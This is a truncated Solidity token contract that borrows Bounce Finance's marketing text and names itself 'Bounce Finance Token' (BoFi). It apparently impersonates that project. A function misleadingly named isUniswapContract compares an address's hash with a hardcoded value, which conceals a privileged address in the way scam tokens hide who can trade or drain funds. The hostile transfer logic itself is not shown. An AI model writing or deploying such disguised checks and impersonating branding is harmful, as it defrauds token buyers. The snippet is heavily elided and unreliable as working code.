...
/*
 ...
 Bounce powers an ecosystem encompassing all types of marketplace, ranging from direct purchase and sales, 
 managing contracts for bespoke work, all the way through to decentralized auctions.

 Play across chains - Bounce products are available across multiple blockchains for more play, more possibility, more potential.

 Full scale participation - An evolving ecosystem of products that allows all kinds of people to participate in decentralized auctions.

 And more...

 www: https://bounce.finance
...
library Address {
    function isUniswapContract(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4aa900cfe1058332215dea1e32975c020bce7c8229e49440939f06b3b94914bc;
    }
}
library SafeMath {
...
contract BOFI is Ownable, IERC20 {
    ...
    uint256 public _totalSupply = 50000000 * 10 ** _decimals;
    uint256 public _feePercent = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Bounce Finance Token";
    string private  _symbol = "BoFi";
